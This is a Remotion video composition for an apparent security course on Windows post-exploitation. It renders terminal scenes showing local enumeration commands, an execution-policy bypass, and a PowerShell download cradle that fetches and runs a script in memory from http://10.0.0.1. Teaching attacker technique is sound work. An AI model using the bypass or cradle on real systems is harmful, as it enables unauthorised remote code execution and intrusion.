// ── video/remotion/compositions/Ps04WindowsEnumerationEn.tsx ─
// English version of ps-04-windows-enumeration. Same visuals; beats
// re-measured against the EN wavs (word-level transcription, 2026-08-30).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS_EN, audioBase } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Scene 1: the Swiss army knife ─────────────────────────
// EN: Swiss army knife 2.8 · processes 4.5 · users 6.0 · done with
// cmdlets 10.5 · first step 12.2 · where you're standing 15.7.
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 32, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 18 }}>
      ENUMERATION: <span style={{ color: THEME.red }}>YOUR SWISS ARMY KNIFE</span>
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      the first step of post-exploitation on Windows
    </div>
    <KeyCapsule label="first step" value="know where you're standing" accent={THEME.cyan} delay={Math.round(12.2 * fps)} size={24} />
    <div style={{ marginTop: 24, fontSize: 17, color: THEME.muted, fontFamily: MONO, textAlign: 'left', width: 780 }}>
      <RevealLine at={4.5} fps={fps} mark="▸" color={THEME.cyan}>processes, services, users, permissions — enumerate them all</RevealLine>
      <div style={{ height: 10 }} />
      <RevealLine at={10.5} fps={fps} mark="▸" color={THEME.green}>everything you enumerate with commands on Linux, here it's done with cmdlets</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Scene 2: privileges, services, users and registry ───
// EN: whoami slash priv 0.0 · SeDebugPrivilege 3.5 · get process
// 5.8 · as system 11.0 · recurse and force 13.3 · net user 16.7 ·
// registry 22.0.
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      PRIVILEGES AND <span style={{ color: THEME.green }}>LOCAL RECON</span>
    </div>
    <TerminalWindow title="PS C:\> .\enum_local.ps1" width={940} delay={Math.round(0.5 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.cyan }}>whoami /priv</span><span style={{ color: THEME.dim }}>                        # SeDebugPrivilege is GOLD</span>
        {'\n'}<span style={{ color: THEME.cyan }}>Get-Process</span><span style={{ color: THEME.text }}>; </span><span style={{ color: THEME.cyan }}>Get-Service</span><span style={{ color: THEME.dim }}>              # processes and services (some run as SYSTEM)</span>
        {'\n'}<span style={{ color: THEME.cyan }}>Get-ChildItem C:\Users -Recurse -Force</span><span style={{ color: THEME.dim }}> # hunts files in the Users folder</span>
        {'\n'}<span style={{ color: THEME.cyan }}>net user</span><span style={{ color: THEME.text }}>; </span><span style={{ color: THEME.cyan }}>net localgroup Administrators</span><span style={{ color: THEME.dim }}>  # accounts and admins</span>
        {'\n'}<span style={{ color: THEME.cyan }}>Get-ItemProperty HKLM:\Software\...</span><span style={{ color: THEME.dim }}>    # reads the registry</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 10, marginTop: 18, flexWrap: 'wrap', justifyContent: 'center' }}>
      <KeyCapsule label="whoami /priv" value="SeDebugPrivilege" accent={THEME.red} delay={Math.round(3.5 * fps)} size={16} />
      <KeyCapsule label="Get-Process / Service" value="SYSTEM services" accent={THEME.amber} delay={Math.round(10.3 * fps)} size={16} />
      <KeyCapsule label="net localgroup" value="Administrators group" accent={THEME.cyan} delay={Math.round(16.7 * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

// ── Scene 3: bypass + download cradle ────────────────────
// EN: execution policy 0.1 · bypass 2.7 · remote execution 8.2 ·
/// download cradle 10.7 · download string 14.3 · in memory 17.6 ·
// pattern 19.9.
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      EXECUTION: <span style={{ color: THEME.cyan }}>BYPASS AND DOWNLOAD CRADLE</span>
    </div>
    <TerminalWindow title="PS C:\> powershell -ep bypass ..." width={940} delay={Math.round(2.7 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.dim }}># 1. Bypass for a script run:</span>
        {'\n'}<span style={{ color: THEME.cyan }}>powershell -ep bypass -File .\enum.ps1</span>
        {'\n'}
        {'\n'}<span style={{ color: THEME.dim }}># 2. Download Cradle: downloads and runs in memory, no disk</span>
        {'\n'}<span style={{ color: THEME.green }}>IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/recon.ps1')</span>
        {'\n'}<span style={{ color: THEME.amber }}>[*] The pattern behind almost every PowerShell payload</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label="-ep bypass" value="skips ExecutionPolicy" accent={THEME.amber} delay={Math.round(4.4 * fps)} size={16} />
      <KeyCapsule label="IEX DownloadString" value="download cradle" accent={THEME.green} delay={Math.round(10.7 * fps)} size={16} />
      <KeyCapsule label="in memory" value="without touching disk" accent={THEME.cyan} delay={Math.round(17.6 * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

export const Ps04WindowsEnumerationEn: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS_EN['ps-04-windows-enumeration'];
  const starts = sceneStartFrames('ps-04-windows-enumeration', fps, 'en');
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase('en');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        <Audio src={staticFile(`${base}/ps-04-windows-enumeration/ps-04-scene1.wav`)} />
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        <Audio src={staticFile(`${base}/ps-04-windows-enumeration/ps-04-scene2.wav`)} />
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        <Audio src={staticFile(`${base}/ps-04-windows-enumeration/ps-04-scene3.wav`)} />
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
